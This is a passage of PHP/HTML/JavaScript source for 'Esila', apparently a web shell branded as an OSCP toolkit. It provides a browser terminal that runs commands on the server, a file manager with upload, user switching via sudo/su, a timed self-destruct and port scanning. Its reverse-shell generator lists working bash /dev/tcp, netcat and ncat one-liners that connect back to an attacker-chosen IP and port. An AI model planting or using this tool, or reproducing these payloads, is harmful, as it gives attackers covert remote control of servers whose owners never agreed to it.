.panel-header { padding:12px 20px; display:flex; align-items:center; gap:12px; border-bottom:1px solid var(--border); background:var(--surface); backdrop-filter:var(--glass-blur); flex-shrink:0; min-height:52px; flex-wrap:wrap; }
.panel-title { font-size:16px; font-weight:600; white-space:nowrap; }
.panel-header .spacer { flex:1; }

/* Components */
.btn { display:inline-flex; align-items:center; gap:6px; padding:8px 14px; background:rgba(255,255,255,0.06); border:1px solid var(--border); border-radius:var(--radius-sm); color:var(--text); font-size:13px; cursor:pointer; transition:all .15s; font-family:inherit; }
.btn:hover { background:rgba(255,255,255,0.1); border-color:var(--border-hover); }
.btn-primary { background:var(--accent); border-color:var(--accent); color:#fff; }
.btn-primary:hover { background:var(--accent-hover); }
.btn-danger { background:rgba(248,81,73,0.15); border-color:rgba(248,81,73,0.3); color:var(--red); }
.btn-danger:hover { background:rgba(248,81,73,0.25); }
.btn-sm { padding:5px 10px; font-size:12px; }
.input { width:100%; padding:8px 12px; background:rgba(255,255,255,0.06); border:1px solid var(--border); border-radius:var(--radius-sm); color:var(--text); font-size:13px; font-family:inherit; outline:none; transition:border-color .2s; }
.input:focus { border-color:var(--accent); }
.input-sm { padding:6px 10px; font-size:12px; }
.card { background:var(--surface); backdrop-filter:var(--glass-blur); -webkit-backdrop-filter:var(--glass-blur); border:1px solid var(--border); border-radius:var(--radius); padding:20px; transition:border-color .2s; }
.card:hover { border-color:var(--border-hover); }
.code-box { background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:var(--radius-sm); padding:12px; font-family:var(--font-mono); font-size:12px; line-height:1.6; overflow-x:auto; white-space:pre-wrap; word-break:break-all; cursor:pointer; max-height:200px; overflow-y:auto; }
.code-box:hover { border-color:var(--accent); }
.grid-2 { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px, 1fr)); gap:16px; }

/* Terminal */
#terminal-container { flex:1; display:flex; flex-direction:column; overflow:hidden; background:#010409; }
#term-output { flex:1; padding:12px 14px; font-family:var(--font-mono); font-size:14px; line-height:1.5; color:#e6edf3; overflow-y:auto; white-space:pre-wrap; word-break:break-all; cursor:text; }
#term-output .prompt-user { color:#007AFF; font-weight:bold; }
#term-output .prompt-host { color:#bc8cff; font-weight:bold; }
#term-output .prompt-path { color:#3fb950; font-weight:bold; }
#term-input-line { display:flex; align-items:center; padding:0 14px 10px; background:#010409; font-family:var(--font-mono); font-size:14px; gap:0; flex-shrink:0; }
#term-input-line .prompt-static { white-space:nowrap; }
#term-input { flex:1; background:transparent; border:none; outline:none; color:#e6edf3; font-family:var(--font-mono); font-size:14px; caret-color:#007AFF; padding:0; margin:0; }
.panel-body { flex:1; overflow-y:auto; padding:20px; }

/* Table */
.fm-table { width:100%; border-collapse:collapse; font-size:13px; }
.fm-table th { text-align:left; padding:8px 12px; color:var(--text-secondary); font-weight:500; border-bottom:1px solid var(--border); font-size:12px; }
.fm-table td { padding:8px 12px; border-bottom:1px solid rgba(255,255,255,0.04); }
.fm-table tr:hover { background:rgba(255,255,255,0.03); }
.fname { cursor:pointer; color:var(--cyan); transition:color .15s; display:flex; align-items:center; gap:6px; }
.fname:hover { color:var(--accent); }

/* Modal */
.modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.6); backdrop-filter:blur(4px); z-index:1000; display:none; align-items:center; justify-content:center; }
.modal-overlay.show { display:flex; }
.modal { background:var(--surface-solid); border:1px solid var(--border); border-radius:var(--radius); padding:24px; width:90%; max-width:700px; max-height:80vh; overflow-y:auto; }
.modal textarea { width:100%; min-height:300px; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:var(--radius-sm); padding:12px; color:var(--text); font-family:var(--font-mono); font-size:13px; outline:none; resize:vertical; }

/* Toast */
.toast { position:fixed; bottom:20px; right:20px; padding:10px 18px; background:var(--surface-solid); border:1px solid var(--border); border-radius:var(--radius-sm); font-size:13px; z-index:2000; transform:translateY(100px); opacity:0; transition:all .3s ease; }
.toast.show { transform:translateY(0); opacity:1; }
.toast.error { border-color:rgba(248,81,73,0.3); color:var(--red); }

/* Mobile */
@media (max-width:768px) {
    .sidebar { position:fixed; left:0; top:0; bottom:0; transform:translateX(-100%); z-index:200; }
    .sidebar.mobile-open { transform:translateX(0); width:260px; }
    .topbar { padding:0 8px; }
    .panel-header { padding:12px; }
    .panel-body { padding:12px; }
    .grid-2 { grid-template-columns:1fr; }
}
.mobile-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:150; }
.mobile-overlay.show { display:block; }
.mobile-hamburger { display:none; background:none; border:none; color:var(--text); cursor:pointer; padding:4px; }
@media (max-width:768px) { .mobile-hamburger { display:block; } }
.mobile-hamburger svg { width:20px; height:20px; }

/* Badges */
.badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:11px; font-weight:500; }
.badge-green { background:rgba(63,185,80,0.15); color:#3fb950; }
.badge-orange { background:rgba(210,153,34,0.15); color:#d29922; }
.badge-red { background:rgba(248,81,73,0.15); color:#f85149; }
.badge-blue { background:rgba(0,122,255,0.15); color:#79c0ff; }
.badge-purple { background:rgba(188,140,255,0.15); color:#bc8cff; }

/* GTFOBins cards */
.gtfo-card { border:1px solid var(--border); border-radius:var(--radius-sm); padding:12px; cursor:pointer; transition:all .15s; background:var(--surface); }
.gtfo-card:hover { border-color:var(--border-hover); background:rgba(255,255,255,0.04); }
.gtfo-card[data-has-revshell] { border-left:3px solid var(--red); }
.gtfo-card[data-has-suid] { border-left:3px solid var(--orange); }
.gtfo-card[data-has-sudo] { border-left:3px solid var(--green); }
</style>
</head>
<body>
<div class="app">
<!-- Top bar -->
<div class="topbar">
    <span class="tb-accent"><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?></span>
    <span class="tb-path" id="tb-path"><?= htmlspecialchars($cwd) ?></span>
    <span class="spacer"></span>
    <span style="color:var(--green);font-size:11px">PHP <?= phpversion() ?></span>
    <span class="clock" id="clock"></span>
</div>

<!-- Mobile overlay -->
<div class="mobile-overlay" id="mobileOverlay" onclick="toggleMobileSidebar()"></div>

<div class="app-body">
<!-- Sidebar -->
<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <div><div class="logo">Esila</div><div class="ver">v<?= VERSION ?> &middot; <?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?></div></div>
        <button class="collapse-btn" onclick="toggleSidebar()" title="Collapse">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
        </button>
    </div>
    <div class="nav">
        <div class="nav-item active" data-panel="terminal" onclick="switchPanel('terminal')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            Terminal
        </div>
        <div class="nav-item" data-panel="revshell" onclick="switchPanel('revshell')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            Reverse Shells
        </div>
        <div class="nav-item" data-panel="gtfobins" onclick="switchPanel('gtfobins')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
            GTFOBins
        </div>
        <div class="nav-item" data-panel="filemanager" onclick="switchPanel('filemanager')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
            File Manager
        </div>
        <div class="nav-item" data-panel="sysinfo" onclick="switchPanel('sysinfo')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            System Info
        </div>
        <div class="nav-item" data-panel="nettools" onclick="switchPanel('nettools')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
            Network Tools
        </div>
        <div class="nav-item" data-panel="settings" onclick="switchPanel('settings')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
            Settings
        </div>
    </div>
    <div class="sidebar-footer">
        <div class="user-info"><div class="user-dot"></div><span><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?></span></div>
    </div>
</div>

<!-- Main content -->
<div class="main">
<!-- Terminal Panel -->
<div class="panel active" id="panel-terminal">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Terminal</span>
        <span style="font-size:12px;color:var(--text-dim);font-family:var(--font-mono)"><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?>:<?= htmlspecialchars($cwd) ?></span>
        <span class="spacer"></span>
        <button class="btn btn-sm" onclick="termClear()">Clear</button>
    </div>
    <div id="terminal-container">
        <div id="term-output" onclick="document.getElementById('term-input').focus()"></div>
        <div id="term-input-line">
            <span class="prompt-static"><span class="prompt-user"><?= htmlspecialchars($username) ?></span>@<span class="prompt-host"><?= htmlspecialchars($hostname) ?></span>:<span class="prompt-path" id="term-prompt-path"><?= htmlspecialchars($cwd) ?></span>$ </span>
            <input type="text" id="term-input" autofocus autocomplete="off" spellcheck="false">
        </div>
    </div>
</div>

<!-- Reverse Shell Panel -->
<div class="panel" id="panel-revshell">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Reverse Shell Generator</span>
        <span class="spacer"></span>
    </div>
    <div class="panel-body">
        <div class="card" style="margin-bottom:16px">
            <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:end">
                <div style="flex:1;min-width:120px"><label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:4px">IP Address</label><input class="input input-sm" id="rs-ip" value="10.10.14.1" oninput="renderRsGrid()"></div>
                <div style="flex:0.5;min-width:80px"><label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:4px">Port</label><input class="input input-sm" id="rs-port" value="4444" oninput="renderRsGrid()"></div>
                <div style="flex:0.5;min-width:100px"><label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:4px">Shell</label><select class="input input-sm" id="rs-shell" onchange="renderRsGrid()"><option>/bin/bash</option><option>/bin/sh</option><option>cmd.exe</option><option>powershell</option></select></div>
                <div style="flex:0.5;min-width:100px"><label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:4px">OS Filter</label><select class="input input-sm" id="rs-os" onchange="renderRsGrid()"><option value="all">All</option><option value="linux">Linux</option><option value="windows">Windows</option></select></div>
            </div>
            <div style="margin-top:12px;display:flex;gap:8px">
                <button class="btn btn-sm" onclick="activeRsTab='reverse';renderRsGrid();" id="rs-tab-reverse" style="border-color:var(--accent)">Reverse</button>
                <button class="btn btn-sm" onclick="activeRsTab='bind';renderRsGrid();" id="rs-tab-bind">Bind</button>
                <button class="btn btn-sm" onclick="activeRsTab='msfvenom';renderRsGrid();" id="rs-tab-msfvenom">MSFVenom</button>
                <button class="btn btn-sm" onclick="activeRsTab='listeners';renderRsGrid();" id="rs-tab-listeners">Listeners</button>
                <button class="btn btn-sm" onclick="activeRsTab='upgrade';renderRsGrid();" id="rs-tab-upgrade">TTY Upgrade</button>
                <button class="btn btn-sm" onclick="activeRsTab='transfer';renderRsGrid();" id="rs-tab-transfer">File Transfer</button>
            </div>
        </div>
        <div id="rs-grid"></div>
    </div>
</div>

<!-- GTFOBins Panel -->
<div class="panel" id="panel-gtfobins">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">GTFOBins</span>
        <span class="spacer"></span>
        <input class="input input-sm" id="gtfo-search" placeholder="Search binaries..." style="max-width:200px" oninput="filterGtfo()">
        <select class="input input-sm" id="gtfo-filter" style="max-width:130px" onchange="filterGtfo()">
            <option value="all">All</option>
            <option value="suid">SUID</option>
            <option value="sudo">Sudo</option>
            <option value="capabilities">Capabilities</option>
            <option value="reverse-shell">Reverse Shell</option>
            <option value="file-read">File Read</option>
            <option value="file-write">File Write</option>
        </select>
    </div>
    <div class="panel-body" id="gtfo-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;align-content:start"></div>
</div>

<!-- File Manager Panel -->
<div class="panel" id="panel-filemanager">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">File Manager</span>
        <span class="spacer"></span>
        <span id="fm-breadcrumb" style="font-family:var(--font-mono);font-size:12px;color:var(--text-secondary)"></span>
        <span class="spacer"></span>
        <button class="btn btn-sm" onclick="fmMkdir()">New Folder</button>
        <label class="btn btn-sm" style="cursor:pointer"><input type="file" id="fm-upload" style="display:none" onchange="fmUpload()">Upload</label>
    </div>
    <div class="panel-body" style="padding:0">
        <div id="fm-content"></div>
    </div>
</div>

<!-- System Info Panel -->
<div class="panel" id="panel-sysinfo">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">System Info</span>
        <span class="spacer"></span>
        <button class="btn btn-sm" onclick="loadSysinfo()">Refresh</button>
    </div>
    <div class="panel-body" id="sysinfo-body">
        <p style="color:var(--text-dim)">Click Refresh or navigate to this panel to load system info.</p>
    </div>
</div>

<!-- Network Tools Panel -->
<div class="panel" id="panel-nettools">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Network Tools</span>
        <span class="spacer"></span>
    </div>
    <div class="panel-body">
        <div class="card" style="margin-bottom:16px">
            <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:end">
                <div style="flex:1;min-width:200px"><label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:4px">Target</label><input class="input input-sm" id="net-target" placeholder="IP or hostname"></div>
                <button class="btn btn-sm btn-primary" onclick="netTool('ping')">Ping</button>
                <button class="btn btn-sm" onclick="netTool('portscan')">Port Scan</button>
                <button class="btn btn-sm" onclick="netTool('traceroute')">Traceroute</button>
                <button class="btn btn-sm" onclick="netTool('dns')">DNS</button>
                <button class="btn btn-sm" onclick="netTool('arp')">ARP</button>
                <button class="btn btn-sm" onclick="netTool('curl')">Curl Headers</button>
            </div>
        </div>
        <div class="card"><div class="code-box" id="net-output" style="min-height:200px">Results will appear here...</div></div>
    </div>
</div>

<!-- Settings Panel -->
<div class="panel" id="panel-settings">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Settings & Danger Zone</span>
    </div>
    <div class="panel-body">
        <div class="grid-2">
            <div class="card">
                <h3 style="margin-bottom:16px">Session</h3>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Current working directory:</p>
                <p style="font-family:var(--font-mono);font-size:13px;margin-bottom:16px"><?= htmlspecialchars($cwd) ?></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">PHP version: <?= phpversion() ?></p>
                <a href="?logout" class="btn btn-danger" style="text-decoration:none;display:inline-block;margin-top:8px">Logout</a>
            </div>
            <div class="card" style="border-color:rgba(0,122,255,0.3)">
                <h3 style="margin-bottom:16px;color:#007AFF">Switch User</h3>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Execute commands as another user. Uses sudo/su on Linux, PowerShell credentials on Windows.</p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Current: <span id="su-current" style="color:var(--green);font-weight:600"><?= htmlspecialchars(isset($_SESSION['su_user']) && $_SESSION['su_user'] ? $_SESSION['su_user'] : trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null'))) ?></span></p>
                <div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">
                    <input class="input input-sm" id="su-username" type="text" placeholder="Username" autocomplete="off">
                    <input class="input input-sm" id="su-password" type="password" placeholder="Password" autocomplete="off">
                    <div style="display:flex;gap:8px">
                        <button class="btn btn-primary btn-sm" onclick="doSwitchUser()">Switch User</button>
                        <button class="btn btn-sm" onclick="doResetUser()">Reset to Default</button>
                    </div>
                    <p id="su-status" style="font-size:12px;color:var(--text-secondary);margin:0"></p>
                </div>
            </div>
            <div class="card">
                <h3 style="margin-bottom:16px">Environment</h3>
                <?php
                $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
                $exec_methods = array('shell_exec','exec','system','passthru','proc_open','popen');
                $available_exec = array();
                foreach ($exec_methods as $fn) {
                    if (function_exists($fn) && !in_array($fn, $disabled)) $available_exec[] = $fn;
                }
                ?>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">OS: <span style="color:var(--text)"><?= IS_WIN ? 'Windows' : 'Linux/Unix' ?> (<?= PHP_OS ?>)</span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">PHP: <span style="color:var(--text)"><?= phpversion() ?></span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Server: <span style="color:var(--text)"><?= htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown') ?></span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Exec methods: <span style="color:<?= count($available_exec) ? 'var(--green)' : 'var(--red)' ?>"><?= count($available_exec) ? implode(', ', $available_exec) : 'NONE AVAILABLE' ?></span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Terminal: <span style="color:var(--text)" id="env-terminal-mode">Checking...</span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Disabled functions: <span style="color:var(--orange);font-size:11px"><?= htmlspecialchars(ini_get('disable_functions') ?: 'none') ?></span></p>
            </div>
            <div class="card" style="border-color:rgba(248,81,73,0.3)">
                <h3 style="margin-bottom:16px;color:var(--red)">Danger Zone</h3>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Self-destruct: delete this webshell after a delay.</p>
                <div style="display:flex;gap:8px;align-items:center">
                    <input class="input input-sm" id="sd-minutes" type="number" min="1" max="1440" value="10" style="width:80px">
                    <span style="font-size:13px;color:var(--text-secondary)">minutes</span>
                    <button class="btn btn-danger btn-sm" onclick="selfDestruct()">Activate Self-Destruct</button>
                </div>
            </div>
        </div>
    </div>
</div>

</div><!-- /main -->
</div><!-- /app-body -->
</div><!-- /app -->

<!-- Edit modal -->
<div class="modal-overlay" id="edit-modal">
    <div class="modal">
        <h3 id="edit-modal-title">Edit File</h3>
        <textarea id="edit-content"></textarea>
        <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end">
            <button class="btn" onclick="closeEditModal()">Cancel</button>
            <button class="btn btn-primary" onclick="saveEdit()">Save</button>
        </div>
    </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
// ===== GLOBALS =====
var USERNAME = <?= json_encode($username) ?>;
var HOSTNAME = <?= json_encode($hostname) ?>;
var HOME = <?= json_encode($home) ?>;
var _cwd_val = <?= json_encode($cwd) ?>;
Object.defineProperty(window, 'CWD', {
    get: function() { return _cwd_val; },
    set: function(v) { _cwd_val = v; var p = document.getElementById('tb-path'); if (p) p.textContent = v; if (typeof updateInputPrompt === 'function') updateInputPrompt(); },
    configurable: true
});
var cmdHistory = <?= json_encode($history) ?>;
var historyIdx = cmdHistory.length;
var currentLine = '';
var fmCurrentPath = CWD;
var editingFile = '';
var activeRsTab = 'reverse';
var activeGtfoFilter = 'all';
var expandedGtfo = null;

// ===== UTILITIES =====
function $(id) { return document.getElementById(id); }
function toast(msg, type='success') {
    const t = $('toast'); t.textContent = msg; t.className = 'toast show ' + type;
    setTimeout(() => t.className = 'toast', 2500);
}
function copyText(text) {
    navigator.clipboard.writeText(text).then(() => toast('Copied!')).catch(() => {
        const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); toast('Copied!');
    });
}
function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
function escJs(s) { return String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'"); }
function formatBytes(b) { if (b === 0) return '0 B'; const k = 1024, s = ['B','KB','MB','GB']; const i = Math.floor(Math.log(b)/Math.log(k)); return parseFloat((b/Math.pow(k,i)).toFixed(1)) + ' ' + s[i]; }
async function api(data) {
    var fd = new FormData();
    var keys = Object.keys(data);
    for (var ki = 0; ki < keys.length; ki++) fd.append(keys[ki], data[keys[ki]]);
    var r = await fetch(window.location.href, { method: 'POST', body: fd });
    return r;
}
async function apiJson(data) { return (await api(data)).json(); }
async function apiText(data) { return (await api(data)).text(); }
function formatPath(p) { return p === HOME ? '~' : ((p.startsWith(HOME + '/') || p.startsWith(HOME + '\\')) ? '~' + p.substring(HOME.length) : p); }

// ===== SIDEBAR =====
function toggleSidebar() { $('sidebar').classList.toggle('collapsed'); }
function toggleMobileSidebar() { $('sidebar').classList.toggle('mobile-open'); $('mobileOverlay').classList.toggle('show'); }

// ===== PANEL SWITCHING =====
function switchPanel(name) {
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    $('panel-' + name).classList.add('active');
    document.querySelector('[data-panel="' + name + '"]').classList.add('active');
    if (name === 'terminal') setTimeout(function(){ $('term-input').focus(); }, 100);
    if (name === 'filemanager') loadFileManager(fmCurrentPath);
    $('mobileOverlay').classList.remove('show');
    $('sidebar').classList.remove('mobile-open');
}

// ===== TERMINAL (pure inline, zero dependencies) =====
var termOutput = $('term-output');
var termInput = $('term-input');
var termBusy = false;
var suUser = '';

function getPromptHtml() {
    var u = suUser || USERNAME;
    return '<span class="prompt-user">' + esc(u) + '</span>@<span class="prompt-host">' + esc(HOSTNAME) + '</span>:<span class="prompt-path">' + esc(formatPath(CWD)) + '</span>$ ';
}

function updateInputPrompt() {
    var u = suUser || USERNAME;
    var ps = document.querySelector('#term-input-line .prompt-static');
    if (ps) ps.innerHTML = '<span class="prompt-user">' + esc(u) + '</span>@<span class="prompt-host">' + esc(HOSTNAME) + '</span>:<span class="prompt-path" id="term-prompt-path">' + esc(formatPath(CWD)) + '</span>$ ';
}

function termWrite(html) {
    termOutput.innerHTML += html;
    termOutput.scrollTop = termOutput.scrollHeight;
}
function termWriteLine(html) { termWrite(html + '\n'); }

// Banner
termWriteLine('<span style="color:#007AFF;font-weight:bold">  ___        _ _       </span>');
termWriteLine('<span style="color:#007AFF;font-weight:bold"> | __|  ___ (_) | __ _ </span>');
termWriteLine('<span style="color:#5856D6;font-weight:bold"> | _|  (_-&lt; | | |/ _` |</span>');
termWriteLine('<span style="color:#bc8cff;font-weight:bold"> |___| /__/ |_|_|\\__,_|</span>');
termWriteLine('<span style="color:#8b949e">  Web Terminal v<?= VERSION ?> | OSCP Toolkit</span>');
termWriteLine('');

function runCommand(cmd) {
    if (!cmd.trim()) return;
    termBusy = true;
    cmdHistory.push(cmd); historyIdx = cmdHistory.length;
    termWrite(getPromptHtml() + esc(cmd) + '\n');
    if (cmd.trim() === 'clear') { termOutput.innerHTML = ''; termBusy = false; return; }
    fetch(window.location.href, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(cmd)})
    .then(function(r){return r.text()}).then(function(out) {
        if (out.indexOf('__CWD__:') === 0) {
            CWD = out.replace('__CWD__:','').trim();
            updateInputPrompt();
        } else {
            termWrite(esc(out) + (out.endsWith('\n') ? '' : '\n'));
        }
        termBusy = false;
    }).catch(function(err) {
        termWriteLine('<span style="color:#f85149">Error: ' + esc(err.message) + '</span>');
        termBusy = false;
    });
}

termInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        var cmd = termInput.value;
        termInput.value = '';
        runCommand(cmd);
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIdx > 0) { historyIdx--; termInput.value = cmdHistory[historyIdx]; }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIdx < cmdHistory.length - 1) { historyIdx++; termInput.value = cmdHistory[historyIdx]; }
        else { termInput.value = ''; historyIdx = cmdHistory.length; }
    } else if (e.key === 'Tab') {
        e.preventDefault();
        var partial = termInput.value;
        fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'autocomplete=' + encodeURIComponent(partial) })
        .then(function(r){return r.text()}).then(function(data) {
            var opts = data.trim().split('\n').filter(Boolean);
            var lastWord = partial.split(/\s+/).pop();
            if (opts.length === 1) {
                termInput.value = partial + opts[0].substring(lastWord.length);
            } else if (opts.length > 1) {
                termWrite(getPromptHtml() + esc(partial) + '\n');
                termWriteLine(esc(opts.join('  ')));
            }
        });
    } else if (e.key === 'c' && e.ctrlKey) {
        e.preventDefault();
        termWrite(getPromptHtml() + esc(termInput.value) + '^C\n');
        termInput.value = '';
    } else if (e.key === 'l' && e.ctrlKey) {
        e.preventDefault();
        termOutput.innerHTML = '';
    }
});

function termClear() { termOutput.innerHTML = ''; termInput.value = ''; }
function termExec(cmd) {
    switchPanel('terminal');
    runCommand(cmd);
}

// ===== REVERSE SHELL DATA =====
var RS_DATA = {
reverse: [
    {name:'Bash -i',lang:'Bash',os:'linux',cmd:'{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'},
    {name:'Bash 196',lang:'Bash',os:'linux',cmd:'0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'},
    {name:'Bash read line',lang:'Bash',os:'linux',cmd:'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'},
    {name:'Bash 5',lang:'Bash',os:'linux',cmd:'{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'},
    {name:'Bash UDP',lang:'Bash',os:'linux',cmd:'{shell} -i >& /dev/udp/{ip}/{port} 0>&1'},
    {name:'nc mkfifo',lang:'Netcat',os:'linux',cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'},
    {name:'nc -e',lang:'Netcat',os:'linux',cmd:'nc {ip} {port} -e {shell}'},
    {name:'nc.exe -e',lang:'Netcat',os:'windows',cmd:'nc.exe {ip} {port} -e {shell}'},
    {name:'BusyBox nc -e',lang:'Netcat',os:'linux',cmd:'busybox nc {ip} {port} -e {shell}'},
    {name:'nc -c',lang:'Netcat',os:'linux',cmd:'nc -c {shell} {ip} {port}'},
    {name:'ncat -e',lang:'Netcat',os:'linux',cmd:'ncat {ip} {port} -e {shell}'},
    {name:'ncat UDP',lang:'Netcat',os:'linux',cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f'},
